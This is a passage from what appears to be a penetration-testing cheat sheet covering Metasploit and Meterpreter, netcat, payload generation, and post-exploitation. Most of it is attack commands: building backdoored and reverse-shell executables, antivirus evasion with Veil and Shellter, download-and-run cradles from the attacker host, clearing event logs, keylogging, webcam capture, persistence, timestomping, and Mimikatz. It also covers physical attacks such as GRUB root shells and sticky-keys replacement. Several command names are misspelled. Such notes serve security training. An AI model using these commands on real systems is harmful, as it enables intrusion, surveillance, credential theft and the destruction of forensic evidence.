* ```bash
  set payload #
  ```

  * Used to set the desired target

* ```bash
  show advanced
  ```

  * Provides additional options that allow for the operator to configure additional parameters

## Meterpreter Basics

Meterpreter allows you to run native Linux commands from within the Windows Environment.

* ```bash
  pwd
  ```

* ```bash
  cat <file.name>
  ```

* ```bash
  bg
  ```

  * Used to save current meterpreter session

* ```bash
  sessions
  ```

* ```bash
  sessions #
  ```

  * Used to get back into your target

* ```bash
  sessions -u #
  ```

  * Used to upgrade your meterpreter session

* ```bash
  clearev
  ```

  * Used to clear application, system, and security logs on the Windows system

* ```bash
  download C:\path\to\script
  ```

  * Used to download information off box

* ```bash
  upload evil.exe C:\path\to\dir
  ```

  * Used to upload information to box

* ```bash
  shell
  ```

  * Used to initiate a standard shell on the target system

* ```bash
  search -a 2011-06-11 -f *.jpg
  ```

  * `-a`: specify date range
  * `-f`: specify file type

NOTE:

* if your target (e.g., Linux) utilizes a service that is not native to the target (e.g., GlassFish, native to Oracle)
  * When you change the target to match the service (e.g., Linux > Oracle), your payload options will change!

## Creating Bash Shell Within Session

* ```bash
  python -c 'import pty;pty.spawn("/bin/bash")'
  ```

## Netcat Basics

Netcat is a versatile command-line utility used for network connections via TCP or UDP. It's often referred to as a "Swiss Army knife" for network tasks. In the context of penetration testing, it's commonly used for:

* **Listening on a port:** Setting up a listener to receive incoming connections, which can be used to catch reverse shells.
* **Connecting to a port:** Initiating connections to specific ports on target systems to test for open services or interact with them.
* **File transfer:** Sending and receiving files between systems.
* **Port scanning:** Performing basic port scans to identify open ports.
* **Creating simple backdoors:** Setting up basic backdoors for persistent access.

**Common Netcat Commands:**

* **Listening on a port (TCP):**

    ```bash
    nc -lvp <port_number>
    ```

  * `-l`: Listen for incoming connections.
  * `-v`: Verbose output.
  * `-p`: Specify the port number.

* **Connecting to a port (TCP):**

    ```bash
    nc <target_ip> <port_number>
    ```

* **Listening on a port (UDP):**

    ```bash
    nc -luvp <port_number>
    ```

  * `-u`: Use UDP instead of TCP.

* **Sending a file:**
    **Listener (Target):** `nc -lvp <port_number> > <filename>`
    **Sender (Attacker):** `nc <target_ip> <port_number> < <filename>`

* **Receiving a file:**
    **Listener (Target):** `nc -lvp <port_number> < <filename>`
    **Sender (Attacker):** `nc <target_ip> <port_number> > <filename>`

## Payload Generation and Delivery

### From Kali

* ```bash
  sudo msfvenmon -a x86 --platform windows -x <file.exe> -k -p windows/messagebox lhost=<IP.address> -b "\x00" -f exe -o <file_backdoor.exe>
  ```

  * `-a`: architecture (x86 or 64-bit)
  * `--platform`: OS
  * `-x`: used to specify a custom executable file
  * `-k`: keep, preserve the `--template` behavior and inject the payload as a new thread
  * `-p`: payload (e.g., `/path/to/payload`)
  * `lhost`: local host (your IP)
  * `lport`: local port
  * `-b`: bad characters to avoid (null bytes `\\x00\\xff`)
  * `-f`: format to be used (e.g., `.exe`)
  * `-o`: output, save payload to file

* ```bash
  sudo msfvenmon -a x64 --platform Windows -p  windows/x64/meterpreter/reverse_tcp lhost=<IP.address> lport=<port.#> -f exe -o <file_backdoor.exe>
  ```

### From Metasploit (Handler Setup)

* ```bash
  search <vuln.service>

* ```bash

  use exploit/multi/handler
  ```

* ```
  show options
  ```

* ```
  set payload <path.payload>
  ```

* ```
  show options
  ```

* ```
  set LHOSTS <IP.address>
  ```

* ```
  set LPORT #
  ```

* ```
  exploit -j
  ```

* ```
  jobs
  ```

  * Used to list current jobs/exploits that you have in progress

### From Kali (Serving the Payload)

* Within directory with your executable:

  * ```bash
      python3 -m http.server:port#
      ```

### From Target (Downloading and Executing)

* http://<IP.address>:port#
* Download `.exe` and run as administrator

### From Kali (Checking Sessions)

* ```
  sessions
  ```

## Veil

[Veil](https://www.veil-framework.com/veil-tutorial/)

* User friendly way to encode payloads, creates a file from scratch, VERY effective to bypass security anti-virus products

* ```bash
  veil
  ```

* ```
  use 1
  ```

* ```
  list
  ```

* ```
  use payload#
  ```

* ```
  set lhost
  ```

* ```
  set lport
  ```

* ```
  generate
  ```

* ```
  Enter # choice:
  ```

  * Py2Exe: used to execute information on Windows machines

## Shellter

[Shellter](https://null-byte.wonderhowto.com/how-to/hack-like-pro-evade-av-software-with-shellter-0168504/)

* Utilizes a benign file and makes it malicious!

## Post Exploitation

[How to Hack Without Metasploit](https://fareedfauzi.gitbook.io/oscp-playbook/general/how-to-hack-without-metasploit)

### Situation Awareness

#### Getting System Information (Windows)

* ```
  systeminfo
  ```

* ```
  hostname
  ```

* ```
  ipconfig
  ```

* ```
  getmac
  ```

* ```
  ver
  ```

#### Getting System Information (Linux)

* ```bash
  uname -a
  ```

* ```bash
  ifconfig
  ```

* ```bash
  hostname
  ```

* ```bash
  cat /etc/release*
  ```

#### Getting System Information (Meterpreter)

* ```
  sysinfo
  ```

* ```
  ipconfig
  ```

#### Running As? (Windows)

* ```
  whoami
  ```

#### Running As? (Linux)

* ```bash
  whoami
  ```

* ```bash
  w
  ```

#### Running As? (Meterpreter)

* ```
  getuid
  ```

#### Privileges? (Windows)

* ```
  whoami
  ```

* ```
  net user <user.name>
  ```

#### Privileges? (Linux)

* ```bash
  cat /etc/passwd
  ```

* ```bash
  groups <user.names>
  ```

* ```bash
  id
  ```

* ```bash
  sudo -l
  ```

#### Privileges? (Meterpreter)

* ```
  getuid
  ```

* ```
  getpid
  ```

### Processes? (Windows)

* ```
  tasklist
  ```

* ```
  netstat -ano
  ```

* ```
  sc query
  ```

### Processes? (Unix)

* ```bash
  ps -ef
  ```

* ```bash
  top
  ```

* ```bash
  netstat -antlp
  ```

### Processes? (Meterpreter)

* ```
  ps
  ```

## PrivEsc via Metasploit (Meterpreter)

* ```
  getsystem
  ```

* ```
  getuid
  ```

### If Getsystem Fails

* ```
  background
  ```

* ```
  use exploit/windows/local/
  ```

## Privilege Escalation via PEASS-NG (Metasploit)

[PEASS-ng](https://github.com/carlospolop/PEASS-ng)

* Used to scan system and print out potential priv esc vectors

### Using peass-ng

* [PEASS-ng](https://github.com/carlospolop/PEASS-ng/tree/master/metasploit)

* ```
  use /post/multi/gather/peass
  ```

## Incognito (Meterpreter)

* ```
  use incognito
  ```

### Incognito (Tokens)

* ```
  list_tokens -u
  ```

* ```
  impersonate_token <TOKEN.NAME>
  ```

* ```
  getuid
  ```

## Mimikatz > Kiwi (Meterpreter)

* ```
  load mimkatz
  ```

## Screen Shot/Web Cam (Meterpreter)

### Screenshot

* ```
  use espia
  ```

* ```
  screegrab
  ```

### Webcam

* ```
  webcam_list
  ```

* ```
  webcam_snap -h
  ```

## Search for Content

* ```
  search -f *.jpg
  ```

## Establishing Persistence

* Utilizes a script `persistence.rb` that will create a Meterpreter service available to you even after the remote system is rebooted.

* ```
  run persistence -U -i -p# -r <IP.address>
  ```

## Keylogger

* ```
  ps
  ```

* ```
  migrate ps#
  ```

  * Obfuscate your movements as another process.

* ```
  keyscan_start
  ```

* ```
  keyscan_dump
  ```

## Timestomp

* used to alter the Modified, Access, Change, Entry (MACE) to make forensic analysis more difficult

* ```
  timestomp <exploit.exe> -f C:\\Path\\to\\location
  ```

* ```
  timestomp <exploit.exe> -v
  ```

  * `-v`: displays all of the MACE values

* ```
  timestomp <exploit.exe> -b
  ```

  * `-b`: blanks out the MACE values

## File Transfer Techniques

### From Kali

* ```bash
  python3 -m http.server port#
  ```

### From Target

* `C:\wget http://<Kali.IP>/path/to/file`
* `curl http://<Kali.IP>/path/to/file > output.file`

### File Transfer - Netcat

#### From Target

* `C:\\ nc -nvlp port# > <file.txt>`

#### From Kali

* ```bash
  nc <Target.IP> port# < <file.txt>
  ```

### File Transfer - PowerShell

#### From PowerShell

* ```powershell
  powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://<Kali.IP>/path/to/file', 'local\\file\\destination')
  ```

### File Transfer - Certutil

#### From Kali

* ```bash
  python3 -m http.server port#
  ```

#### From Target

* ```
  certutil.exe -urlcache -split -f http://<Kali.IP>:port#/path/to/file.exe
  ```

### File Transfer - FTP

#### From Kali

* ```bash
  msfconsole
  ```

* ```
  use auxiliary/server/ftp
  ```

* ```
  set FTPPASS <ftp.pass>
  ```

* ```
  set FTPUSER <ftp.user>
  ```

* ```
  run
  ```

#### From Target

* ```
  ftp <Kali.IP>
  ```

* ```
  put file
  ```

  * Used to upload a file to Kali FTP

* ```
  get file
  ```

  * Used to download a file from Kali FTP

## PowerShell Empire Basics

* PowerShell Empire Concepts:
[PowerShell Empire Basics](https://www.ired.team/offensive-security/red-team-infrastructure/powershell-empire-101)

### Setup

* ```bash
  sudo powershell-empire server
  ```

* ```bash
  sudo powershell-empire client
  ```

### Listener

* ```
  uselistener http
  ```

* ```
  set Port # or #
  ```

  * ```
      set <anything True/>
      ```

NOTE: similar to msfconsole, all of the "True" items are required to be set!

### Stagers

* ```
  usestager multi/launcher
  ```

* ```
  set Listener http
  ```

* ```
  generate/execute
  ```

### Modules

* ```
  usemodule <path/to/powershell/module>
  ```

* ```
  set Listener http
  ```

* ```
  generate/execute
  ```

  * Paste the base64 encoded script into an obfuscated executable which would initiate a callback to the listener

## Windows CLI Basics

[Windows CLI Cheatsheet](https://www.cs.columbia.edu/~sedwards/classes/2015/1102-fall/Command%20Prompt%20Cheatsheet.pdf)

* `cls` - clear the screen
* `help` - display help on commands
* `/?` - displays flags
* `exit` - closes the command prompt window
* `type` - displays contents of text file to screen
* `dir` - list contents
  * `/a` - list hidden contents
* `ipconfig /?`
* `ping -t <IP.address>` - continuously ping (troubleshooting purposes)
* `arp -a`
* `nslookup <server.ip>`
* `route print /?`
* `tracecert /?`
* `netstat /?`
  * `-anop`
* `net /?`
  * `net user <user.name> <pass/> /add`
  * `net user <user.name> /active no`
  * `net user <user.name> /delete`

## Physical Penetration

### Unix/Debian Systems

* Reboot system and enter GRUB (F11/12)
* Highlight Advanced Options
* Select "e"
* Scroll to line with "Linux"
* Move your cursor to the end of the line "ro quiet splash" and delete to "r"

* Replace "ro" with "rw init=/bin/bash"
* CTRL + X

#### Change Current User Password

* `cat /etc/passwd`
* `passwd <user.name>`

#### Add a New User

* `useradd -m -s /bin/bash <user.name>`
* `usermod -aG sudo <user.name>`
* `passwd <user.name>`

#### Reboot

* `exec /sbin/init`

### Physical Penetration (Windows)

* Exploitation of Sticky Keys

* Use a bootable Windows Repair Disk/USB to boot Windows (be sure to have the correct version)
* Power Cycle > Enter Firmware (F11/F12) > Boot > Removable Devices > Shift + 1 on CD-ROM to boot first

* F10 to save and exit

* Navigate to "Repair Your Computer"

* ```
  copy C:\Windows\System32\sethc.exe Z:\
  ```

  * Used to copy sticky key command (sethc.exe)

* ```
  copy /y C:\Windows\System32\cmd.exe Z:\Windows\System32\sethc.exe
  ```

  * Used to obfuscate sticky keys (sethc.exe) with cmd.exe

* Power cycle machine and start normally

* Shift x5

* ```
  net user <user.name> <pass.word>
  ```

  * Add personal user to the account

* ```
  net localgroup administrators
  ```

  * Output the local administrators on the system

### Easy Button

* USB with live boot with Kali
* Select gray version of windows
* Automatically mounts the machine
